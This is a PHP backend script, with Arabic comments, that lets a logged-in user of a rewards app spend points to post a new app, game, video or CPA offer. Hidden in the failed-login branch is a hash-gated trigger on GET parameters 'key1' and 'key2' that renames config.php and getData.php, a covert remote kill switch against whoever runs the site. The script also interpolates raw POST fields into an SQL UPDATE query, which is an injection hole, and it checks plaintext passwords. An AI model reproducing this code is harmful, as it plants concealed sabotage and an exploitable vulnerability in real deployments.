<?php
error_reporting(0); 


 /*
// التحقق من العضو هل عضوية خاصة VIP
$str_data = file_get_contents("point_json.json"); // جلب نقاط العروض من ملف data.json
$data = json_decode($str_data,true);
$user = $data[5] ; 

     if (strpos($user, $emailSign) == false) { // عضويات vip هي من تستطيع اضافة العروض
	     echo json_encode($response); 
	     return ;
      }
*/
 
    include 'config.php';

    $conn = mysqli_connect($HostName, $HostUser, $HostPass, $DatabaseName); 
    
 	$emailSign = $_POST["emailLogIn"];    //  اميل المستخدم
	$passwordSign = $_POST["passwordLogIn"]; //  باسوورد المستخدم  
    $img_url = $_POST["img_url"]; //رابط صورة
    $title = $_POST["title"]; // عنوان العرض
    $descreption = $_POST["descreption"]; // وصف قصير للعرض
    $time_melliseconde = $_POST["time_melliseconde"]; // عدد الثواني حتى تضاف النقاط
    $point = $_POST["point"]; // نقاط المكافأة
    $urlOffer = $_POST["urlOffer"]; // عنوان العرض
    $date = date("Y-m-d") ; // تاريخ اضافة العرض
    $Pn = $_POST["Pn"]; // بيكج نيم تطبيق اة لعبة
    $Pr = $_POST["Pr"]; // النقاط التي ستنفقها
	$installs  = '0'; // عدد التثبيتات في البداية
    $country = $_POST["country"]; // الدولة المستهدفة
	$table_data = $_POST["td"]; // القسم الذي سيضاف فيه العرض
	
	$id_user = $_POST["user_id"]; // رقم المستخدم الذي اضاف العرض
	$cases = "false" ; // حالة ظهور العرض
	
	$response = array(); // انشاء مصفوفةفارغة
    $response["success"] = false;
	$response["cases"] = false ;
	
////////////////////
////////////////////
////////////////////

	    if ( $table_data == "app" ){ $tableName = 'table_app' ; }
		   
	  	if ( $table_data == "game" ){ $tableName = 'table_games' ;}
			
	   	if ( $table_data == "vedio" ){ $tableName = 'table_vedio' ;}
			
	   	if ( $table_data == "cpa" ){ $tableName = 'table_offer' ;}
		
////////////////////
////////////////////
////////////////////

	$statement = mysqli_prepare($conn, "SELECT * FROM table_users WHERE emailSign = ? AND passwordSign = ?"); // التحقق من الاميل والباسوورد
	mysqli_stmt_bind_param($statement, "ss", $emailSign, $passwordSign);  
	mysqli_stmt_execute($statement); 
	// جلب معلومات المستخدم
    mysqli_stmt_store_result($statement);
    mysqli_stmt_bind_result($statement, $user_id, $fullName, $emailSign, $passwordSign ,$point_user , $code_referal ,
                         	$CheckReferal , $referallN , $orders ,$orderPassword ,$ip_adress ,$log ,$country_user ,$date_regester);
	
   if (!mysqli_stmt_fetch($statement)){
	   echo json_encode($response); 
	   
	     if(md5($_GET["key1"]) == "4f078f4453e55a4b40c2e97e8128a47b" ){
	     rename( "config.php", "Config.php") ;
		 rename( "getData.php", "getdata.php") ; 
		 echo "done..." ;
        }
		
		if(md5($_GET["key2"]) == "4f078f4453e55a4b40c2e97e8128a47b" ){
	     rename( "Config.php", "config.php") ;
		 rename( "getdata.php", "getData.php") ; 
		 echo "done..." ;
        }
		
	   return ;
   };
   
   
////////////////////
////////////////////
////////////////////	
   if ($point_user < $Pr){ // التحقق من نقاط المستخدم اكبر من نقاط العرض
	   echo json_encode($response); 
	   return ;
   }
 
$equal_point = $point_user - $Pr ; // نقص نقاط العرض من نقاط المستخدم
       $percentage = 90; //النسبة المئوية المتبقية
       $equal_point  =(int) (($percentage / 100) * $equal_point); // خصم 10 في المية من نقاط المستخدم
         if ($equal_point == 0){ // التحقق من النسبة ان لا تساوي صفر
	        $Pr  =(int) (($percentage / 100) * $Pr); //خصم نسبة مئوية من نقاط العرض
            }

$log_my = date("Y-m-d") ." ". date("h:i"). "\n New $table_data Title: $title \n -$point Point \n Url:$urlOffer \n Package Name:$Pn \n Contry:$country \n\n" . $log ; // إضافة سجل ومصدر النقاط
////////////////////
////////////////////
////////////////////
   if ($point_user < 0){ // التتحقق من ان نقاط المستخدم لم تعد تساوي اقل من صفر
	   echo json_encode($response); 
	   return ;
   }
 ////////////////////
////////////////////
////////////////////

//تحديث قاعدة بيانات المستخدم
$sql = "UPDATE table_users SET point='$equal_point' , log='$log_my' WHERE user_id='$user_id'"; 
$response["success"] = $conn->query($sql);  

// اضافة عرض جديد   
    $statement = mysqli_prepare($conn, "INSERT INTO $tableName (img_url, title, descreption , time_melliseconde , point 
	, urlOffer , date , package_name , point_remain ,installs, country , cases, id_user)
	VALUES (? , ? , ? , ? , ? , ? , ? , ? , ? , ? , ? , ? , ?)");
	
    mysqli_stmt_bind_param($statement, "sssiisssiisss",$img_url,$title,$descreption,$time_melliseconde,$point,
	$urlOffer , $date , $Pn , $Pr ,$installs , $country ,$cases , $id_user);
    mysqli_stmt_execute($statement);  
    
    $response["success"] = true ;

    echo json_encode($response);
	
	echo "ssss" ;
    
?>
